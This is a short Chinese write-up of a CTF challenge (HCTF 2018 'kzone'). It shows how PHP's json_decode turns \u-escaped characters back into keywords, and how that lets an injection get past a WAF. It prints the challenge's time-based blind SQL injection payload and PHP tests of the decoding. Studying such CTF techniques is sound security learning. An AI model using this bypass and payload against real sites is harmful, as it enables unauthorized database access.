# json_decode函数在绕过waf中的应用



之前一直没看懂hctf2018中的kzone那道题目

这是poc，不明白怎么就稀里糊涂的绕过了waf

```php
$poc = "'\u006fr\u0020su\u0062str((select\u0020binary\u0020F1a9\u0020from\u0020F1444g\u0020limit\u00200,1),1,1)\u003d'0'\u0020and\u0020sl\u0065ep(6)\u0023";
```



测试了一下之后发现

```php
$id = '{"admin_user": "\u006fr"}';
var_dump($id);
var_dump(json_decode($id));
```



```php
string(25) "{"admin_user": "\u006fr"}"
object(stdClass)#1 (1) {
  ["admin_user"]=>
  string(2) "or"
}

```

发现`\u006fr`在`json_decode`之后变成了`or`这个字符串

```php
$id = '{"admin_user": "\u006fr\u0020su\u0062"}';
var_dump($id);
var_dump(json_decode($id));
```

这个这个

```php
string(39) "{"admin_user": "\u006fr\u0020su\u0062"}"
object(stdClass)#1 (1) {
  ["admin_user"]=>
  string(6) "or sub"
}
```



